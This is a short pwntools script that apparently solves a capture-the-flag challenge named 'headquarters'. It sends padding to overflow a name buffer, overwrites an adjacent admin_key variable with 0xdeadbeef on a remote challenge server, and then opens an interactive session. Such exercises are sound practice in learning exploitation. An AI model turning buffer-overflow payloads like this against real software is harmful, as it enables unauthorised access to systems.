from pwn import *

elf = context.binary = ELF('../src/bin/headquarters')

local = False

if not local:
    io = remote('challs.sieberr.live', 1003)
else:
    io = elf.process(stdin=PTY)


payload = b'A'*8 # fill up the `name` buffer
payload += p64(0xdeadbeef) # overwrite `admin_key` to 0xdeadbeef

io.sendline(payload)
io.interactive()
